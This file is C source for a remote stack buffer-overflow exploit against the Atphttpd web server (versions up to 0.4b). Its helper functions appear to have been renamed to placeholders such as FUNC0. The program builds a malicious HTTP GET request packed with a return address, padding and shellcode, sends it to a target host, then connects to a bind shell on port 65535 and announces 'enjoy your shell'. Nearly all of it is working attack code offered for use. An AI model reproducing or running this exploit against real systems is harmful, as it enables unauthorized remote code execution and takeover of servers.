#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 size_t ALIGN ; 
 unsigned long DEFAULT_OFFSET ; 
 int LEN ; 
 int PORT ; 
 unsigned long FUNC0 (char*) ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 int FUNC2 (char*,int) ; 
 int /*<<< orphan*/  FUNC3 (int) ; 
 int /*<<< orphan*/  FUNC4 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC5 (char*) ; 
 int /*<<< orphan*/  FUNC6 (char*,...) ; 
 scalar_t__ FUNC7 (int,char*,int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC8 (int) ; 
 char* shellcode ; 
 int /*<<< orphan*/  FUNC9 (int) ; 
 int /*<<< orphan*/  stdout ; 
 int FUNC10 (char*) ; 

int FUNC11(int argc,char **argv) {
	int i,sd;
	char http_req[LEN];
	unsigned long int ret=0,offset=DEFAULT_OFFSET;


	FUNC6("(<->) Atphttpd <= 0.4b remote exploit by r-code d_fence@gmx.net\n");
	FUNC6("(<->) Greetz to: czarny,|stachu|, Nitro, Zami, Razor, Jedlik, Cypher\n\n");
	

	if(argc<2 || argc>3){
		FUNC6("[-] Usage: %s [host] <offset> #OFFset\n",argv[0]);
		return -1;
	}
			
	
	if(argc>2)
		offset=FUNC0(argv[2]);
	
	ret=0xbffffffa - offset;
	
	FUNC6("<==> OFFSET: 0x%x\n",offset);
	FUNC6("<==> RET_ADDR: 0x%x\n",ret);
			

	/* See comment few lines below ;] */
	
	http_req[0x00]='G';
	http_req[0x01]='E';
	http_req[0x02]='T';
	http_req[0x03]=' ';
	http_req[0x04]='/';
	
	 for(i=0x05;i<LEN;) {
		 http_req[ALIGN + i++] = (ret & 0x000000ff);
		 http_req[ALIGN + i++] = (ret & 0x0000ff00) >> 8;
		 http_req[ALIGN + i++] = (ret & 0x00ff0000) >> 16;
		 http_req[ALIGN + i++] = (ret & 0xff000000) >> 24;
	 }

	
	 for(i=0x05;i<(LEN/2);i++)
		 http_req[i]=0x41;          /* Using jump-next instruction instead of nops for a better look ;] */
	     
         for(i=0;i<FUNC10(shellcode);i++)
	         http_req[(LEN/2)-(FUNC10(shellcode)/2)+i]=shellcode[i];
		     
	 
	http_req[LEN-0x0c]=' ';
	http_req[LEN-0x0b]='H';
	http_req[LEN-0x0a]='T';
	http_req[LEN-0x09]='T';
	http_req[LEN-0x08]='P';
	http_req[LEN-0x07]='/';
	http_req[LEN-0x06]='1';
	http_req[LEN-0x05]='.';
	http_req[LEN-0x04]='1';
	http_req[LEN-0x03]=0x0d;
	http_req[LEN-0x02]=0x0a;
	http_req[LEN-0x01]=0x00;

	/* Yeah.. I know I just could strcpy/cat it ;].. but so it looks soooooo l33t ;] aint`t it ? ;) */
	
	FUNC6("<==> Connecting to '%s' on port '%d'..\n",argv[1],PORT);
	
	if((sd=FUNC2(argv[1],PORT))<0) {
		FUNC6("<==> Couldn`t connect to host.. :-/\n");
		FUNC3(1);
	}
	
	FUNC6("<==> Sending packets..\n");
			
		
	if(FUNC7(sd,http_req,LEN,0)<0) {
		FUNC5("<==> send(): while sending evil http request");
		return -1;
	}

	FUNC1(sd);
		
	if((sd=FUNC2(argv[1],65535))<0) {
		FUNC6("<==> Exploit failed..! #Probably due to a bad offset\n");
		return -1;
	}


	FUNC6("\n### Exploit failed ");
	FUNC4(stdout);
	FUNC9(1);
	FUNC6("... just kidding ;]\n");
	FUNC9(1);
	FUNC6("### Exploit successful - enjoy your shell\n\n");
	FUNC8(sd);
	
	return 1;
}